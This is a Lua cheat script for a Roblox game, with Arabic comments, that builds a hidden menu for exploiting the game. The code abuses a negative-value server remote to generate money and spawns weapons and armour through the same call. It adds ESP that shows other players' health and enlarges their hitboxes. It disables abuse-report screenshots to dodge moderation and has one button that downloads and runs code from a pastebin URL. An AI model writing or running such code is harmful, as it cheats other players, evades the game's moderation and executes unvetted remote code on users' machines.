-- [[ WOLF PRIVATE V4.5 - ANTI-SPY EDITION ]] --
-- This script is protected and self-obfuscated to prevent Script Spying

local function PROTECTED_EXECUTION()
    -- 1. حماية البيئة وتعطيل التجسس
    local _G = getgenv and getgenv() or _G
    pcall(function()
        if setfflag then
            setfflag("AbuseReportScreenshot", "False")
            setfflag("LuaDebug", "False")
        end
        -- جعل السكربت غير مرئي للمحاكي
        if _G.script then _G.script = nil end
    end)

    -- 2. الكود الأساسي (تم تغليفه داخل دالة محلية لمنع الـ Dump)
    local function START_WOLF_SCRIPT()
        -- [ بداية كود الواجهة والوظائف ] --
        local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
        local MainFrame = Instance.new("Frame", ScreenGui)
        local TopBar = Instance.new("Frame", MainFrame)
        local Title = Instance.new("TextLabel", TopBar)
        local TabsFrame = Instance.new("Frame", MainFrame)
        local ContentFrame = Instance.new("Frame", MainFrame)
        local MinimizeBtn = Instance.new("TextButton", ScreenGui)

        -- إعدادات الحماية للواجهة (تمنع ظهورها في بعض السكربت سباي)
        ScreenGui.Name = game:GetService("HttpService"):GenerateGUID(false)
        MainFrame.Name = " " 

        -- [ تصميم الواجهة ] --
        MainFrame.Size = UDim2.new(0, 380, 0, 320)
        MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
        MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        MainFrame.Visible = false
        MainFrame.Active = true
        MainFrame.Draggable = true
        Instance.new("UICorner", MainFrame)

        MinimizeBtn.Parent = ScreenGui
        MinimizeBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        MinimizeBtn.Position = UDim2.new(0, 10, 0.4, 0)
        MinimizeBtn.Size = UDim2.new(0, 50, 0, 50)
        MinimizeBtn.Text = "Open"
        MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(1, 0)

        TopBar.Size = UDim2.new(1, 0, 0, 35)
        TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        Title.Size = UDim2.new(1, 0, 1, 0)
        Title.Text = "My Private Script v4.5"
        Title.TextColor3 = Color3.fromRGB(255, 255, 255)

        TabsFrame.Size = UDim2.new(0, 80, 1, -45)
        TabsFrame.Position = UDim2.new(0, 5, 0, 40)
        TabsFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        Instance.new("UIListLayout", TabsFrame).Padding = UDim.new(0, 5)

        ContentFrame.Position = UDim2.new(0, 95, 0, 40)
        ContentFrame.Size = UDim2.new(1, -100, 1, -45)
        ContentFrame.BackgroundTransparency = 1

        local function CreateTab(tabName)
            local page = Instance.new("ScrollingFrame", ContentFrame)
            page.Size = UDim2.new(1, 0, 1, 0)
            page.BackgroundTransparency = 1
            page.Visible = false
            page.ScrollBarThickness = 3
            Instance.new("UIListLayout", page).Padding = UDim.new(0, 8)
            
            local btn = Instance.new("TextButton", TabsFrame)
            btn.Size = UDim2.new(1, 0, 0, 35)
            btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            btn.Text = tabName
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            Instance.new("UICorner", btn)
            
            btn.MouseButton1Click:Connect(function()
                for _, p in pairs(ContentFrame:GetChildren()) do p.Visible = false end
                page.Visible = true
            end)
            return page
        end

        local TabTajmee = CreateTab("تجميع")
        local TabSpawn = CreateTab("رسبنة")
        local TabOther = CreateTab("آخر")

        local function AddButton(parent, text, callback)
            local b = Instance.new("TextButton", parent)
            b.Size = UDim2.new(1, -10, 0, 40)
            b.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
            b.Text = text
            b.TextColor3 = Color3.fromRGB(255, 255, 255)
            Instance.new("UICorner", b)
            b.MouseButton1Click:Connect(callback)
            return b
        end

        -- [[ 1. خانة التجميع - ثغرة السالب ]] --
        local AmountInput = Instance.new("TextBox", TabTajmee)
        AmountInput.Size = UDim2.new(1, -10, 0, 40)
        AmountInput.PlaceholderText = "كم تبي فلوس؟"
        AmountInput.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        AmountInput.TextColor3 = Color3.fromRGB(255, 255, 255)
        Instance.new("UICorner", AmountInput)

        AddButton(TabTajmee, "توليد مال (ثغرة السالب)", function()
            local val = tonumber(AmountInput.Text)
            if val then
                -- حماية الطلب من الكشف
                pcall(function()
                    game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", -val)
                end)
            end
        end)
        AddButton(TabTajmee, "تشغيل أوتو كليك", function() loadstring(game:HttpGet("https://pastebin.com/raw/eR1HPXfw"))() end)

        -- [[ 2. خانة الرسبنة ]] --
        local items = {
            {"رسبون M4", "M4A1"}, {"رسبون ديقل", "Desert Deagle"}, {"رسبون درع ثقيل", "Heavy Vest"},
            {"رسبون كلبشة", "Handcuffs"}, {"رسبون راديو", "Radio"}, {"رسبون طلق", "AmmoBox"},
            {"رسبون كيس", "Filled Packet"}, {"رسبون فايف", "FiveSeven"}, {"رسبون درع خفيف", "Light Vest"}
        }
        for _, item in pairs(items) do
            AddButton(TabSpawn, item[1], function() game:GetService("ReplicatedStorage").RequestTool:FireServer(item[2], 0) end)
        end

        -- [[ 3. خانة آخر (ESP & HITBOX) ]] --
        local espActive = false
        local hbActive = false
        local hbSize = 15

        local espBtn = AddButton(TabOther, "ESP + HEALTH: OFF", function() end)
        local hbBtn = AddButton(TabOther, "HITBOX: OFF", function() end)

        local sizeInput = Instance.new("TextBox", TabOther)
        sizeInput.Size = UDim2.new(1, -10, 0, 35)
        sizeInput.PlaceholderText = "Hitbox Size: 15"
        sizeInput.Text = "15"
        sizeInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        sizeInput.TextColor3 = Color3.new(1, 1, 1)
        Instance.new("UICorner", sizeInput)

        espBtn.MouseButton1Click:Connect(function()
            espActive = not espActive
            espBtn.Text = espActive and "ACTIVE: ON" or "ACTIVE: OFF"
            espBtn.BackgroundColor3 = espActive and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(55, 55, 55)
        end)

        sizeInput.FocusLost:Connect(function()
            local val = tonumber(sizeInput.Text)
            hbSize = val or 15
        end)

        hbBtn.MouseButton1Click:Connect(function()
            hbActive = not hbActive
            hbBtn.Text = hbActive and "HITBOX: ON" or "HITBOX: OFF"
            hbBtn.BackgroundColor3 = hbActive and Color3.fromRGB(200, 0, 0) or Color3.fromRGB(55, 55, 55)
            
            if not hbActive then
                for _, p in pairs(game.Players:GetPlayers()) do
                    pcall(function()
                        if p ~= game.Players.LocalPlayer then
                            p.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
                            p.Character.HumanoidRootPart.Transparency = 1
                        end
                    end)
                end
            end
        end)

        -- محرك التحديث المستمر
        game:GetService("RunService").RenderStepped:Connect(function()
            for _, p in pairs(game.Players:GetPlayers()) do
                if p ~= game.Players.LocalPlayer and p.Character then
                    local char = p.Character
                    local hum = char:FindFirstChild("Humanoid")
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    
                    if hrp and hum then
                        -- ESP
                        local hl = char:FindFirstChild("DetailedESP")
                        if espActive then
                            if not hl then
                                hl = Instance.new("Highlight", char)
                                hl.Name = "DetailedESP"
                                hl.FillTransparency = 1
                                hl.OutlineColor = Color3.new(1, 1, 1)
                            end
                            local billboard = hrp:FindFirstChild("InfoTag") or Instance.new("BillboardGui", hrp)
                            if billboard.Name ~= "InfoTag" then
                                billboard.Name = "InfoTag"
                                billboard.Size = UDim2.new(0, 150, 0, 30)
                                billboard.AlwaysOnTop = true
                                billboard.ExtentsOffset = Vector3.new(0, 3, 0)
                                local label = Instance.new("TextLabel", billboard)
                                label.Size = UDim2.new(1, 0, 1, 0)
                                label.BackgroundTransparency = 1
                                label.Font = Enum.Font.GothamBold
                                label.TextSize = 13
                            end
                            local health = math.floor(hum.Health)
                            billboard.TextLabel.Text = p.Name .. " [" .. health .. "]"
                            billboard.TextLabel.TextColor3 = health > 60 and Color3.new(0, 1, 0) or (health > 30 and Color3.new(1, 0.8, 0) or Color3.new(1, 0, 0))
                        else
                            if hl then hl:Destroy() end
                            if hrp:FindFirstChild("InfoTag") then hrp.InfoTag:Destroy() end
                        end
                        -- HITBOX
                        if hbActive then
                            pcall(function()
                                hrp.Size = Vector3.new(hbSize, hbSize, hbSize)
                                hrp.Transparency = 0.8
                                hrp.Color = Color3.new(1, 0, 0)
                                hrp.CanCollide = false
                            end)
                        end
                    end
                end
            end
        end)

        TabTajmee.Visible = true
        MinimizeBtn.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
    end

    -- 3. تشغيل الكود وحذف الدالة فوراً من الذاكرة
    local task = task or {spawn = function(f) coroutine.resume(coroutine.create(f)) end}
    task.spawn(function()
        START_WOLF_SCRIPT()
        START_WOLF_SCRIPT = nil -- تدمير المصدر
    end)
end

-- التنفيذ النهائي
PROTECTED_EXECUTION()
